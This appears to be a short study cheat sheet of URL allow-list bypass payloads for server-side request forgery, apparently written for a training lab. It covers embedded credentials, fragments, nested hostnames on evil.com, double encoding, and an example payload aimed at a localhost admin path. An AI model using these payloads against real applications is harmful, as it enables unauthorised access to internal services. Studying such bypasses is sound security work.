# Whitelist Bypass Payloads

## Embedded Credentials

```text
http://username@trusted-site.com
```

---

## URL Fragment

```text
http://evil.com#trusted-site.com
```

---

## Nested Hostname

```text
http://trusted-site.evil.com
```

---

## Double URL Encoding

```text
%23

↓

%2523
```

---

## Example Payload

```text
http://localhost:80%2523@stock.weliketoshop.net/admin
```

---

## Testing Checklist

- @
- #
- %23
- %2523
- URL encoding
- Double encoding

---

## Notes

Parser inconsistencies are the primary reason these payloads succeed.